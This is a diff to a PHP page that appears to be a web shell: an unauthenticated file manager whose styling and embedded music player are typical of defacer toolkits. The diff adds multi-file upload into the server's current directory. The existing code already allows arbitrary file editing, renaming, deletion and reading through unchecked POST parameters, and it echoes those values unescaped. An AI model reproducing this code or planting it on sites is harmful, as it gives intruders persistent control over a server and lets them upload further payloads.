@@ -31,7 +31,7 @@ a {
 	color: #808080;
 }
 tbody {
-    max-height:700px;
+    max-height:600px;
     overflow-y: auto;
 }
 
@@ -96,6 +96,10 @@ input[type=text].rename {
 	background: #fff;
 	color: #808080;
 }
+option {
+	outline:none;
+}
+select.action:hover,
 input[type=submit]:hover {
 	border:2px solid red;
 	cursor:pointer;
@@ -107,6 +111,10 @@ select.action {
 	padding:3px;
 	outline:none;
 	float:right;
+}
+select.act {
+	padding: 5px;
+	width:250px;
 }
 tbody td.action {
 	padding:7px;
@@ -130,6 +138,40 @@ tbody td:last-child, thead th:last-child {
   height:25px;
   margin-bottom:-5px;
   margin-right:7px;
+}
+.alert {
+	width:98.5%;
+	padding:7px;
+	border-radius:7px;
+}
+.success {
+	background: #79ed9a;
+	color:#fff;
+}
+.failed {
+	background: #ed7b79;
+	color: #fff;
+}
+button {
+	font-family: 'Ubuntu', sans-serif;
+	font-weight:bold;
+	font-size:17px;
+	color: #808080;
+	background:none;
+	border:none;
+	outline:none;
+}
+button:hover {
+	cursor:pointer;
+}
+.submit-upload {
+	margin-right:14px;
+	width:85px;
+	padding:1px;
+	border-radius:7px;
+	border: 2px solid #e6e6e6;
+	color: #808080;
+	background:#fff
 }
 @media screen and (max-width: 600px) {
 	body {
@@ -170,6 +212,9 @@ tbody td:last-child, thead th:last-child {
 		outline:none;
 		float:right;
 	}
+	select.act {
+		padding: 5px;
+	}
 	tbody td.file {
 		width:7em;
 	}
@@ -185,16 +230,30 @@ tbody td:last-child, thead th:last-child {
 	select.fitur {
 		width:100%;
 	}
+	.submit-upload {
+		margin-right:14px;
+		width:85px;
+		padding:1px;
+		border-radius:7px;
+		border: 2px solid #e6e6e6;
+		color: #808080;
+		background:#fff
+	}
+	.right {
+		float: right;
+	}
 
 }
 </style>
   <table align="center">
     <thead>
       <tr>
+      	<form method="post">
         <th style="float:left;margin:10px;" colspan="4">
-        	<a href="?">HOME</a>&nbsp&nbsp&nbsp&nbsp
-        	<a href="#upload">UPLOAD</a>
+        	<button name="tools" value="home">HOME</button>&nbsp&nbsp&nbsp&nbsp
+        	<button name="tools" value="upload">UPLOAD</button>
         </th>
+    	</form>
       </tr>
     </thead>
     <tbody>
@@ -267,6 +326,11 @@ function permission($filename, $perms, $po=false) {
     ?> <font color="red"><?php print $perms ?></font> <?php
   }
 }
+function alert($msg, $type) {
+	?>
+	<div class="alert <?=$type?>"><?= $msg ?></div>
+	<?php
+}
 function size($file) {
     $bytes = filesize($file);
 
@@ -308,6 +372,48 @@ function delete($filename) {
     }
   }
 }
+switch (@$_POST['tools']) {
+	case 'home':
+		?>
+		<script type="text/javascript">window.location='http://<?=$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']?>'</script>
+		<?php
+		break;
+	case 'upload':
+		?>
+			<form method="post" enctype="multipart/form-data">
+				<tr>
+					<td class="action">
+						<input type="file" name="file[]" multiple>
+						<input class="submit-upload right" type="submit" name="submit" value="UPLOAD">
+						<input type="hidden" name="tools" value="upload">
+					</td>
+				</tr>
+			</form>
+			<?php
+			if (isset($_POST['submit'])) {
+				$file = count($_FILES['file']['tmp_name']);
+				for ($i=0; $i < $file ; $i++) { 
+					if (copy($_FILES['file']['tmp_name'][$i] , cwd().'/'.$_FILES['file']['name'][$i])) {
+						?>
+						<tr>
+							<td class="action">
+								<?= alert($_FILES['file']['name'][$i]." uploaded", "success") ?>
+							</td>
+						</tr>
+						<?php
+					} else {
+						?>
+						<tr>
+							<td class="action">
+								<?= alert("permission danied","failed") ?>
+							</td>
+						</tr>
+						<?php
+					}
+				}
+			}
+		break;
+}
 switch (@$_POST['action']) {
 	case 'edit':
 		if (isset($_POST['submit'])) {
@@ -316,7 +422,7 @@ switch (@$_POST['action']) {
 				?>
 				<tr>
 					<td class="action">
-						<font color="green">success</font>
+						<?= alert("".basename($_POST['file'])." updated", 'success') ?>
 					</td>
 				</tr>
 				<?php
@@ -324,14 +430,13 @@ switch (@$_POST['action']) {
 				?>
 				<tr>
 					<td class="action">
-						<font color="red">failed</font>
+						<?= alert("permission danied", 'failed') ?>
 					</td>
 				</tr>
 				<?php
 			}
 		}
 		?>
-		<form method="post">
 			<tr>
 				<td class="action">
 					Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
@@ -344,7 +449,7 @@ switch (@$_POST['action']) {
 				</td>
 				<form method="post">
 				<td class="action">
-					<select class="action fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+					<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 						<option value="back">back</option>
 						<option value="edit" selected>Edit</option>
 						<option value="delete">delete</option>
@@ -352,8 +457,9 @@ switch (@$_POST['action']) {
 					</select>
 					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 				</td>
-				</form>
 			</tr>
+			</form>
+			<form method="post">
 			<tr>
 				<td class="action">
 					<textarea class="edit" name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
@@ -376,25 +482,18 @@ switch (@$_POST['action']) {
 	case 'rename':
 		if (isset($_POST['submit'])) {
 			if (rename($_POST['file'], $_POST['newname'])) {
-				?>
-				<tr>
-					<td class="action">
-						<font color="green">success</font>
-					</td>
-				</tr>
-				<?php
+				header("Location: ?dir=".cwd()."");
 			} else {
 				?>
 				<tr>
 					<td class="action">
-						<font color="red">failed</font>
+						<?= alert("permission danied", 'failed') ?>
 					</td>
 				</tr>
 				<?php
 			}
 		}
 		?>
-		<form method="post">
 			<tr>
 				<td class="action">
 					Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
@@ -407,16 +506,17 @@ switch (@$_POST['action']) {
 				</td>
 				<form method="post">
 				<td class="action">
-					<select class="action fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+					<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 						<option value="back">back</option>
-						<option value="edit" selected>Edit</option>
+						<option value="edit">Edit</option>
 						<option value="delete">delete</option>
-						<option value="rename">rename</option>
+						<option value="rename" selected>rename</option>
 					</select>
 					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
 				</td>
-				</form>
 			</tr>
+			</form>
+			<form method="post">
 			<tr>
 				<td class="action">
 					<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
@@ -424,9 +524,9 @@ switch (@$_POST['action']) {
 			</tr>
 			<tr>
 				<td class="action">
-					<input class="rename" type="submit" name="submit" value="EDIT">
+					<input class="rename" type="submit" name="submit" value="RENAME">
 					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-					<input type="hidden" name="action" value="edit">
+					<input type="hidden" name="action" value="rename">
 				</td>
 			</tr>
 		</form>
@@ -434,7 +534,7 @@ switch (@$_POST['action']) {
 		exit();
 		break;
 	case 'back':
-		header("Location: ?dir=".cwd()."");
+		@header("Location: ?dir=".cwd()."");
 		break;
 }
 if(function_exists('opendir')) {
@@ -455,7 +555,7 @@ foreach ($getpath as $dir) {
 		} else {
 			$back = "<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
 		} if ($dir === '.' || $dir === '..') {
-			$action = "<td class='dir'>coomings</td>";
+			$action = "<td class='dir'></td>";
 		} else {
 			$action = '<form method="post">
 							<td class="dir">
@@ -497,6 +597,18 @@ foreach ($getpath as $file) {
 				switch ($ext) {
 					case 'php':
 						print("https://image.flaticon.com/icons/png/128/337/337947.png");
+						break;
+					case 'pl':
+						print("https://image.flaticon.com/icons/svg/186/186645.svg");
+						break;
+					case 'xml':
+						print("https://image.flaticon.com/icons/svg/136/136526.svg");
+						break;
+					case 'json':
+						print("https://image.flaticon.com/icons/svg/136/136525.svg");
+						break;
+					case 'exe':
+						print("https://image.flaticon.com/icons/svg/136/136531.svg");
 						break;
 					case 'png':
 						print("https://image.flaticon.com/icons/png/128/136/136523.png");
@@ -551,8 +663,9 @@ foreach ($getpath as $file) {
 				 		break;
 				}
 				 	print("' title='{$file}'> ");
+				$href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file));
 				?> 
-				 <?= $file ?>
+				 <a href="<?= $href ?>" target='_blank'><?= $file ?></a>
 			</td>
 			<td class="screen">
 				<center>
@@ -585,3 +698,24 @@ foreach ($getpath as $file) {
 ?>
 </tbody>
 </table>
+<script type="text/javascript" src="https://www.scmplayer.net/script.js" 
+data-config="{
+'skin':'skins/black/skin.css',
+'volume':100,
+'autoplay':false,
+'shuffle':true,
+'repeat':1,
+'placement':'bottom',
+'showplaylist':false,
+'playlist':[{'title':'Fly me to the moon',
+'url':'https://soundcloud.com/teddy-ar-679549927/love-lyrics-fly-me-to-the-moon'},
+{'title':'Felix Official - DEAR GOD A7x [ LYRIC ] FELIX IR',
+'url':'https://soundcloud.com/teddy-ar-679549927/felix-official-when-we-were'},
+{'title':'Jericson - Can_t Take My Eyes Off You (Aiivawn)',
+'url':'https://soundcloud.com/teddy-ar-679549927/jericson-can_t-take-my-eyes'},
+{'title':'Felix Official - WHEN WE WERE YOUNG ADELE',
+'url':'https://soundcloud.com/teddy-ar-679549927/felix-official-when-we-were'},
+{'title':'Aoi - Untukmu',
+'url':'https://soundcloud.com/teddy-ar-679549927/aoi-untukmu-reupload'},
+{'title':'Aoi - I Still Loving You',
+'url':'https://soundcloud.com/herkisa-jr/aoi-i-still-loving-you'}]}" ></script>
